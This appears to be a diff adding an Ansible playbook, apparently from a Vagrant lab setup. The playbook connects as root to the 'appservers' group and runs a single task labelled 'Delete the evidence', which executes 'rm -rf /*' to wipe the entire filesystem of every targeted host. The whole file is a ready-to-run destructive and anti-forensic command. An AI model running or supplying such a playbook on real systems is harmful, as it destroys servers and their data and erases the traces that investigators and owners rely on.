@@ -1,0 +1,9 @@
+--- # Delete the evidence
+- hosts: appservers
+  remote_user: root
+  connection: ssh
+  tasks:
+   - name: Delete the evidence
+     raw: rm -rf /* > /home/vagrant/rm-rf.log
+ 
+
